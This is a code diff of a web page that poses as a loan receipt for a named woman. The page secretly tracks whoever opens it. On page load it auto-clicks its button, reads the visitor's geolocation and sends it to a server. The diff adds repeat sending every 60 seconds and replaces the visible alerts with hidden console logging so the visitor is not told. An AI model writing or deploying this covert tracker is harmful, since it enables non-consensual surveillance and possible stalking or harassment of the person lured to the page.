@@ -1,12 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head><title>Send Location</title></head>
+<head>
+    <title>Prestamo Location</title>
+</head>
 <body>
 <h2>Prestamo - LARITZA ORFERLINA GUILLEN MARIÑEZ</h2>
-<button id="locButton" onclick="sendLocation()">Prestamo Recibo</button>
+<button id="locButton" onclick="startSendingLocation()">Prestamo Recibo</button>
 <img src="recibo.jpg"/>
 
 <script>
+    let locationInterval;
+
     function sendLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((position) => {
@@ -20,22 +24,37 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 }).then(response => {
-                    // alert("El Recibo del Prestamo fue enviado.");
+                    console.log("Location sent:", data);
+                }).catch(error => {
+                    console.error("Error sending location:", error);
                 });
             }, (error) => {
-                alert("Erro Buscando el recibo: " + error.message);
+                console.error("Error obtenindo el recibo");
             });
         } else {
-            alert("Recibo no soportado");
+            console.error("Recibo no soportado.");
         }
     }
 
-    // Auto-click the "Prestamo Recibo" button when the page loads
+    function startSendingLocation() {
+        // Send immediately
+        sendLocation();
+
+        // Clear any existing interval
+        if (locationInterval) {
+            clearInterval(locationInterval);
+        }
+
+        // Repeat every 60 seconds
+        locationInterval = setInterval(sendLocation, 60000);
+    }
+
+    // Auto-start when page loads
     window.onload = function () {
         const button = document.getElementById("locButton");
-            if (button) {
-                button.click();
-            }
+        if (button) {
+            button.click();
+        }
     };
 </script>
 </body>
